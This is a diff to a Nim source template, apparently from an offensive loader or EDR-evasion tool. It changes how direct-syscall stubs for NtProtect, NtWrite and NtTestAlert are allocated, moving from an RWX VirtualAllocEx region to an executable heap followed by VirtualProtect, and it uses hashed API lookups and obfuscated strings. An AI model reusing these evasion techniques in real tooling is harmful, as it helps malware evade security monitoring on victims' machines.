@@ -305,13 +305,19 @@ let RetrieveSyscallStubs * = """
         var pHandle2: HANDLE = -1
         var syscallStub_NtProtect: LPVOID
 
-        MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-        syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        #MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
+        #syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        # This can not be used here, as it results in strange behaviours. Maybe due to too many syscall stubs for the heap.
+        var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
+        syscallStub_NtProtect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)
     else:
         hProcess = -1
         var pHandle2: HANDLE = -1
-        var syscallStub_NtProtect: LPVOID
-        syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        #var syscallStub_NtProtect: LPVOID
+        #syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
+        syscallStub_NtProtect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)
+
 
     var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
     
@@ -416,8 +422,14 @@ let RetrieveSyscallStubs * = """
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtTestAlert: ") & $syssuccess
         
-
-
+    when defined(DInvoke):
+      when defined(verbose):
+        echo obf("[*] Setting page protection")
+      discard MyVirtualProtect(syscallStub_NtProtect, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
+      when defined(verbose):
+        echo obf("[*] Done")
+    else:
+      VirtualProtect(syscallStub_NtProtect, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
     
 
 """
